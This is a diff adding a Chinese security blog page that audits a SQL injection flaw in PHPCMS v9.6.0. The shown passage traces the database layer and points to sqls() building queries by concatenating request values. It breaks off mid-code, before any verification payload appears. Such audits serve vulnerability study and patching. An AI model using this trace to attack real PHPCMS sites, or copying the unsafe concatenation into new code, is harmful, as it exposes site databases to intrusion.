@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PHPCMSv9.6.0 SQL注入漏洞分析 - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="PHPCMSV9.6.0 SQL注入漏洞分析"><meta name="keywords" content='SQL Injection'>
+  <meta itemprop="name" content="PHPCMSv9.6.0 SQL注入漏洞分析">
+  <meta itemprop="description" content="PHPCMSV9.6.0 SQL注入漏洞分析">
+  <meta itemprop="datePublished" content="2025-07-29T12:41:54+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:46+08:00">
+  <meta itemprop="wordCount" content="1240">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="SQL Injection"><meta property="og:url" content="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="PHPCMSv9.6.0 SQL注入漏洞分析">
+  <meta property="og:description" content="PHPCMSV9.6.0 SQL注入漏洞分析">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-29T12:41:54+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:46+08:00">
+    <meta property="article:tag" content="SQL Injection">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="PHPCMSv9.6.0 SQL注入漏洞分析" /><meta name="twitter:description" content="PHPCMSV9.6.0 SQL注入漏洞分析" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" title="PHPCMSv9.6.0 SQL注入漏洞分析 - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-mvc%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" title="PHPCMSv9 MVC模式学习" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.1-2 任意文件下载漏洞分析" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/index.md" title="PHPCMSv9.6.0 SQL注入漏洞分析 - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PHPCMSv9.6.0 SQL注入漏洞分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "SQL Injection","wordcount":  1240 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1\/","datePublished": "2025-07-29T12:41:54+00:00","dateModified": "2026-07-09T18:34:46+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PHPCMSv9.6.0 SQL注入漏洞分析</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-07-29T12:41:54Z">29 Jul, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#全局分析">全局分析</a>
+      <ul>
+        <li><a href="#数据库分析">数据库分析</a></li>
+        <li><a href="#php-特性分析">PHP 特性分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#审计">审计</a>
+      <ul>
+        <li><a href="#代码审计">代码审计</a></li>
+        <li><a href="#漏洞验证">漏洞验证</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞修复">漏洞修复</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>PHPCMS V9.6.0存在 SQL 注入漏洞，对其进行代码审计学习</p>
+<h1 class="heading-element" id="全局分析"><span>全局分析</span>
+  <a href="#%e5%85%a8%e5%b1%80%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="数据库分析"><span>数据库分析</span>
+  <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>本漏洞中核心是下列代码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">down</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">rs</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">get_one</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="nb">id</span><span class="p">));</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>所以在正式漏洞审计前，先分析一下操纵数据库的公共库文件，以此对这段程序的数据库操作有个基本认知
+db-&gt;get_one() 从模型对象中调用类方法，这个模型对象在 phpcms/modules/content/down.php 构造方法中被定义</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">down</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="err">$</span><span class="n">db</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;content_model&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">//</span><span class="n">调用静态方法</span><span class="err">，</span><span class="n">加载数据模型</span> <span class="n">content_model</span><span class="o">.</span><span class="n">class</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>content_model.class.php 的构造方法进行加载配置文件、定义属性、调用父类构造方法、加载应用类方法，并获取当前的站点ID</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">content_model</span> <span class="n">extends</span> <span class="n">model</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_config</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_config</span><span class="p">(</span><span class="s1">&#39;database&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">			  <span class="o">=&gt;</span> 
+</span></span><span class="line"><span class="cl">				<span class="c1">#caches/configs/database.php 内容</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">array</span> <span class="p">(</span>  
+</span></span><span class="line"><span class="cl">					<span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="n">array</span> <span class="p">(</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;hostname&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;port&#39;</span> <span class="o">=&gt;</span> <span class="mi">3306</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;phpcmsv9&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xx&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xx&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;tablepre&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;v9_&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;charset&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;debug&#39;</span> <span class="o">=&gt;</span> <span class="n">true</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;pconnect&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">					   <span class="s1">&#39;autoconnect&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span>  
+</span></span><span class="line"><span class="cl">					   <span class="p">),</span>  
+</span></span><span class="line"><span class="cl">				<span class="p">);</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">       <span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">url</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_app_class</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">siteid</span> <span class="o">=</span> <span class="n">get_siteid</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>但在该类中并没有定义 get_one 类方法，在其父类 extends model 中找到</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">model</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">final</span> <span class="n">public</span> <span class="n">function</span> <span class="n">get_one</span><span class="p">(</span><span class="err">$</span><span class="n">where</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">order</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">group</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">where</span><span class="p">))</span> <span class="err">$</span><span class="n">where</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">sqls</span><span class="p">(</span><span class="err">$</span><span class="n">where</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	      <span class="o">=&gt;</span><span class="c1">#sqls类方法</span>
+</span></span><span class="line"><span class="cl">			<span class="n">final</span> <span class="n">public</span> <span class="n">function</span> <span class="n">sqls</span><span class="p">(</span><span class="err">$</span><span class="n">where</span><span class="p">,</span> <span class="err">$</span><span class="n">font</span> <span class="o">=</span> <span class="s1">&#39; AND &#39;</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">			    <span class="k">if</span> <span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">where</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">			       <span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">			       <span class="n">foreach</span> <span class="p">(</span><span class="err">$</span><span class="n">where</span> <span class="k">as</span> <span class="err">$</span><span class="n">key</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">val</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">			          <span class="err">$</span><span class="n">sql</span> <span class="o">.=</span> <span class="err">$</span><span class="n">sql</span> <span class="err">?</span> <span class="s2">&#34; $font `$key` = &#39;$val&#39; &#34;</span> <span class="p">:</span> <span class="s2">&#34; `$key` = &#39;$val&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			          <span class="o">//</span><span class="n">对传参语句进行拼接</span><span class="err">，</span><span class="n">中间用</span> <span class="n">AND</span> <span class="n">连接</span>
+</span></span><span class="line"><span class="cl">			          <span class="o">//</span><span class="n">如</span> <span class="nb">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">sql</span><span class="o">=</span><span class="mi">2</span><span class="err">，</span><span class="n">变为</span> <span class="err">`</span><span class="nb">id</span><span class="err">`</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="n">AND</span> <span class="err">`</span><span class="n">sql</span><span class="err">`</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span>  
+</span></span><span class="line"><span class="cl">			       <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">			       <span class="k">return</span> <span class="err">$</span><span class="n">sql</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">			    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">			       <span class="k">return</span> <span class="err">$</span><span class="n">where</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">			    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">get_one</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">,</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">,</span> <span class="err">$</span><span class="n">where</span><span class="p">,</span> <span class="err">$</span><span class="n">order</span><span class="p">,</span> <span class="err">$</span><span class="n">group</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>到此为止，get_one 都没有进行 SQL 语句执行，继续往下追踪。
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>b</mi><mo>−</mo><mo>&gt;</mo><mi>g</mi><mi>e</mi><msub><mi>t</mi><mi>o</mi></msub><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">this -&gt; db -&gt; get_one(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">hi</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">b</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span>data&hellip;) 调用本类的 db 模型对象，同样在构造方法中定义</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">model</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">[</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>  
